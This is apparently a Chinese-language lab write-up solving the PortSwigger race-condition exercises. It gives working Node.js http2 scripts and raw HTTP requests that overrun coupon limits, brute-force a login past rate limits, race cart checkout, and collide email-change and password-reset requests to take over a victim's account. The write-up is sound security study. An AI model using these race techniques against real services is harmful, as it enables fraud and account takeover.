---
title: Race conditions
description: Race conditions
last_update:
  date: "2025-11-03T08:00:00+08:00"
---

## Lab: Limit overrun race conditions

| Dimension | Description                                                                            |
| --------- | -------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/race-conditions#limit-overrun-race-conditions     |
| Lab       | https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun |

這題很簡單，就是要同時送出很多個兌換碼的 HTTP Request，但很可惜，但要在瀏覽器控制併行送出多個請求會比較困難

```js
const couponForm = document.getElementById("coupon-form");
const sp = new URLSearchParams();
sp.append("csrf", "hJBGfUUwkgeehlxTw7z4T2IuBGB7nBOy");
sp.append("coupon", "PROMO20");
function applyCoupon() {
  return fetch(couponForm.action, {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: sp.toString(),
  });
}
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
```

稍微調整一下，改用 NodeJS 試試看

```js
const couponForm = document.getElementById("coupon-form");
const sp = new URLSearchParams();
sp.append("csrf", "hJBGfUUwkgeehlxTw7z4T2IuBGB7nBOy");
sp.append("coupon", "PROMO20");
function applyCoupon() {
  return fetch(`${location.origin}/cart/coupon`, {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      Cookie: "session=oQf2bCYK3mMzTQnM3OP1YuZbr6mNFlen",
    },
    body: sp.toString(),
  });
}
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
```

結果更廢，大概只有 成功兌換 1 ~ 2 張折價券，看來需要尋找一個可以併行送出多個請求的 script 或工具

後來嘗試用 NodeJS 的 http2 模組，成功率有大幅上升，可惜我還沒寫 HTTP2 的文章，就要先碰到 HTTP2 的知識QQ

```ts
import http2, { ClientHttp2Session } from "http2";

const client1 = http2.connect(
  "https://0aeb00a00410a86b81408080007800c2.web-security-academy.net",
);
const client2 = http2.connect(
  "https://0aeb00a00410a86b81408080007800c2.web-security-academy.net",
);
const sp = new URLSearchParams();
sp.append("csrf", "eR7LzJBiKxvQVa8HadtAQcjUw6iYeWtN");
sp.append("coupon", "PROMO20");
const body = sp.toString();
const contentLength = Buffer.byteLength(body);

function applyCoupon(client: ClientHttp2Session, idx: number) {
  const request = client.request({
    ":method": "POST",
    ":path": "/cart/coupon",
    "Content-Type": "application/x-www-form-urlencoded",
    Cookie: "session=D3JPEkSb1gMHkQY9BjgzZZCqZm5kxXN0",
    "Content-Length": contentLength,
  });
  request.end(body);
  // const chunks: any[] = []
  request.on("response", (headers) => {
    const isSuccess =
      headers.location === "/cart" && headers[":status"] === 302;
    console.log({ isSuccess, client: idx % 2 === 0 ? "client1" : "client2" });
  });
  // request.on('data', (chunk) => chunks.push(chunk))
  // request.on('end', () => console.log(Buffer.concat(chunks).toString('utf8')))
}

Array(40)
  .fill(0)
  .map((_, idx) =>
    idx % 2 === 0 ? applyCoupon(client1, idx) : applyCoupon(client2, idx),
  );
```

成功解題，雖然不是每次都能穩穩地兌換 10 幾張折價券，但至少成功率比 fetch 高太多了

後來我看了解答，發現 Burp Repeater 也可以做到同樣的事情，且不用寫任何程式碼，也是蠻方便的

## 中途暫停

這系列的 Labs，從我 2025/10/15 打完第一題，我就覺得，我要先理解 HTTP2 的知識，這樣打起來會比較輕鬆，所以我會先去把其他系列的 Labs 打完，之後再來解這邊～

## Lab: Bypassing rate limits via race conditions

| Dimension | Description                                                                                                                     |
| --------- | ------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/race-conditions#detecting-and-exploiting-limit-overrun-race-conditions-with-turbo-intruder |
| Lab       | https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits                                  |

這題我沒有用 Burp Suite，而是用熟悉的 NodeJS，一次就解題

```ts
function lab2() {
  const passwords = `123123
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
1234567890
michael
x654321
superman
1qaz2wsx
baseball
7777777
121212
000000`.split("\n");
  const clientHttp2Session = http2.connect(
    "https://0a150020039eb5c480f16289008700c0.web-security-academy.net",
  );
  for (const password of passwords) {
    const stream = clientHttp2Session.request({
      "content-type": "application/x-www-form-urlencoded",
      ":path": "/login",
      ":method": "POST",
      cookie: "session=on0zOCAuNADvlSMo1j52etH30UIKqVx2",
    });
    stream.end(
      `csrf=LIsY5AzRWv4fJXFtqa0kbkxm6tEok6OY&username=carlos&password=${password}`,
    );
    stream.on("response", (headers) => {
      console.log(headers[":status"]);
      if (headers[":status"] === 302) console.log(password);
    });
  }
  console.log("ok");
}

lab2();
```

前面的介紹有提到 `concurrentConnections=1`，我想就是指，要在一個 Http2Session 同時發送多個請求，所以我只有 `http2.connect` 一次

## Lab: Multi-endpoint race conditions

| Dimension | Description                                                                             |
| --------- | --------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/race-conditions#multi-endpoint-race-conditions     |
| Lab       | https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint |

https://portswigger.net/web-security/race-conditions/images/race-conditions-basket-adjustment-race.png 有介紹到購物車 addToCart 跟 checkout 的 race condition，所以直接用 NodeJS http2 來寫 exploit

```ts
function lab3() {
  const cookie = "session=5ZWx7xl6NJB2OcEUV7ZhFzjhez0vqYM8";
  const clientHttp2Session = http2.connect(
    "https://0a3800f503887485807b0dc400a100a0.web-security-academy.net",
  );

  const checkoutStream = clientHttp2Session.request({
    "content-type": "application/x-www-form-urlencoded",
    ":path": "/cart/checkout",
    ":method": "POST",
    cookie: cookie,
  });
  checkoutStream.end("csrf=RdBIuGJJsR6fKUzTjis1nr4zhLS7T3Yv");

  const addToCartStream = clientHttp2Session.request({
    "content-type": "application/x-www-form-urlencoded",
    ":path": "/cart",
    ":method": "POST",
    cookie: cookie,
  });
  addToCartStream.end("productId=1&redir=PRODUCT&quantity=1");
}
```

一次成功，好虛幻，因為我沒有把 response body 印出來，所以只能回到 lab 看有沒有成功解題XD

## Lab: Single-endpoint race conditions

| Dimension | Description                                                                              |
| --------- | ---------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/race-conditions#single-endpoint-race-conditions     |
| Lab       | https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint |

按照 [race-conditions-password-reset-collision](https://portswigger.net/web-security/race-conditions/images/race-conditions-password-reset-collision.png) 的做法

<!-- todo-yus 重打 + 時間軸 -->

PoC

```ts
function lab4() {
  const csrf = "rdV8DUvAyBOEC5gnrE470rkROZjTRPD9";
  const cookie = "session=R3bD21aRw8Dfd1iUqvAvxNczouBnwjYT";
  const origin =
    "https://0aab0039043c69e382b3a6e500af0096.web-security-academy.net";
  const clientHttp2Session = http2.connect(origin);
  const changeEmailStream1 = clientHttp2Session.request({
    "content-type": "application/x-www-form-urlencoded",
    ":path": "/my-account/change-email",
    ":method": "POST",
    cookie: cookie,
  });
  changeEmailStream1.end(
    `email=helloworld%40exploit-0a42005e0414696f82d1a54001d4003c.exploit-server.net&csrf=${csrf}`,
  );
  const changeEmailStream2 = clientHttp2Session.request({
    "content-type": "application/x-www-form-urlencoded",
    ":path": "/my-account/change-email",
    ":method": "POST",
    cookie: cookie,
  });
  changeEmailStream2.end(`email=carlos%40ginandjuice.shop&csrf=${csrf}`);
}
```

## Lab: Partial construction race conditions

| Dimension | Description                                                                                   |
| --------- | --------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/race-conditions#partial-construction-race-conditions     |
| Lab       | https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction |

這題的概念是，先發送一個註冊的請求

```
POST /register HTTP/2
Host: 0ad600f403a44380bce3cf8a004d0013.web-security-academy.net
Cookie: phpsessionid=lk3WAHziPRfMb4H5Rg1iSOZirRQWzBX1
Content-Type: application/x-www-form-urlencoded
Content-Length: 103

csrf=XuF72hUyhKsfvY73MDBEz8pIEC0ESvuf&username=user80&email=user80%40ginandjuice.shop&password=password
```

同時間發送

```
POST /confirm?token[]= HTTP/2
Host: 0ad600f403a44380bce3cf8a004d0013.web-security-academy.net
Cookie: phpsessionid=lk3WAHziPRfMb4H5Rg1iSOZirRQWzBX1
Content-Length: 0


```

我嘗試用 NodeJS http2 模組來寫，都不成功，只好用官方解法

推測是因為 NodeJS http2 提供的 API 沒辦法很精細的控制 TCP 封包的發送，畢竟 NodeJS 只有提供

```ts
const stream = clientHttp2Session.request();
stream.end();
```

沒辦法控制 TCP Packet 的大小，所以這種情況還是建議用 Turbo Intruder 這種專門的工具QQ

## Lab: Exploiting time-sensitive vulnerabilities

<!-- todo-yus 重打 + 時間軸 -->

| Dimension | Description                                                                                                        |
| --------- | ------------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/race-conditions#time-sensitive-attacks                                        |
| Lab       | https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities |

這題會使用到 [Session-based locking mechanisms](https://portswigger.net/web-security/race-conditions#session-based-locking-mechanisms) 的概念，需要用兩個不同的 `phpsessionid` 在同一時間發出 `/forgot-password` 的請求

```ts
function lab6() {
  const origin =
    "https://0a4400c003eddf588011a3b100a100ce.web-security-academy.net";
  const clientHttp2Session = http2.connect(origin);
  const stream1 = clientHttp2Session.request({
    "content-type": "application/x-www-form-urlencoded",
    cookie: "phpsessionid=XXz2mTTeYzwdmF5cyrJGrHDZqPGsAq0q",
    ":method": "POST",
    ":path": "/forgot-password",
  });
  const stream2 = clientHttp2Session.request({
    "content-type": "application/x-www-form-urlencoded",
    cookie: "phpsessionid=J8v2LeLg0CVHupVhkdHf0B3JTfNPFH9Z",
    ":method": "POST",
    ":path": "/forgot-password",
  });
  stream1.end(`csrf=rXZSrY5pjhXhGcBW8Mlq5qTsS6d8gcYF&username=wiener`);
  stream2.end(`csrf=zliJ2MkhBQAjP100EcPQEP9l7IYRcpwK&username=carlos`);
}
```

這樣就會生成同樣的 passwordResetToken，就可以修改受害者（carlos）的密碼了

## 小結

有先把 [http2](../http/http-2.md) 的基礎概念搞懂，再來打這系列的 Labs 真的會很輕鬆，除了 [Lab: Partial construction race conditions](#lab-partial-construction-race-conditions) 這題比較複雜，其餘我都是用 NodeJS http2 模組解的。

## 參考資料

- https://portswigger.net/web-security/race-conditions
